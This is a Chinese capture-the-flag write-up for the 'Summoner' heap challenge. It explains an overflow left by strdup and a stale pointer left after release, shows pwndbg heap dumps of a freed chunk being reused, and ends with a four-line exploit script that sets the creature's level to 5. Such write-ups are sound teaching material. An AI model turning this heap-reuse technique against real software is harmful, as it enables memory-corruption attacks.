# Summoner

本次比赛唯二的堆题，但是极其简单。邪恶召唤师召唤了一只5级生物，但是你只能召唤四级生物，你的目的就是修改生物的等级为5级。

题目提供了几种命令：
- 展示召唤物信息
- 召唤一只生物，并给它起名字
- 设置生物的等级，但必须小于5
- 攻击敌方召唤物
- 释放召唤物

我们通过逆向可以得知，召唤物的结构体长这样：
```c
struct creature {
    char *name;
    int level;
};
```

随后可以发现两处漏洞：
- 召唤时，输入的`name`使用`strdup`函数（隐式调用了`malloc`），但并没有检查长度，因此可以溢出到下一个8字节处。
- 在释放召唤物时，只会调用`free(c->name)`，然后将结构体指针置空，但并不会释放结构体指针本身。

因此我们尝试先召唤一个名为`aaaaaaaa\x05`的生物，此时堆结构如下：
```bash
pwndbg> heapls
           ADDR             SIZE            STATUS
sbrk_base  0x56476bb24000
chunk      0x56476bb24000   0x1010          (inuse)
chunk      0x56476bb25010   0x20            (inuse)
chunk      0x56476bb25030   0x20            (inuse)
chunk      0x56476bb25050   0x20fb0         (top)
sbrk_end   0x56476bb46000
pwndbg> x/8gx 0x56476bb25010
0x56476bb25010:	0x0000000000000000	0x0000000000000021
0x56476bb25020:	0x000056476bb25040	0x0000000000000000
0x56476bb25030:	0x0000000000000000	0x0000000000000021
0x56476bb25040:	0x6161616161616161	0x0000000000000005
```

可以看到有2块0x20的chunk，第一块是结构体指针，存放着`name`地址和`level`数值；第二块就是`name`了，存放着我们输入的`name`，注意这时第二个8字节已经是5了。随后我们释放召唤物：
```
pwndbg> x/8gx 0x5621c569e010
0x5621c569e010:	0x0000000000000000	0x0000000000000021
0x5621c569e020:	0x00005621c569e040	0x0000000000000000
0x5621c569e030:	0x0000000000000000	0x0000000000000021
0x5621c569e040:	0x0000000000000000	0x0000000000000005
```
这时`name`被`free`了但指针还在，我们刚刚写的`\x05`也还在。这时再召唤就能得到`0x5621c569e030`处的一块chunk作为结构体指针，而新的`name`跑到了`0x55feced35050`：
```
pwndbg> x/12gx 0x55feced35010
0x55feced35010:	0x0000000000000000	0x0000000000000021
0x55feced35020:	0x000055feced35040	0x0000000000000000
0x55feced35030:	0x0000000000000000	0x0000000000000021
0x55feced35040:	0x000055feced35060	0x0000000000000005
0x55feced35050:	0x0000000000000000	0x0000000000000021
0x55feced35060:	0x0000000000000061	0x0000000000000000
```

于是此时，结构体指针里的`level`就变成了5。
```py
sla('> ','summon aaaaaaaa'+'\x05')
sla('> ','release')
sla('> ','summon a')
sla('> ','strike')
```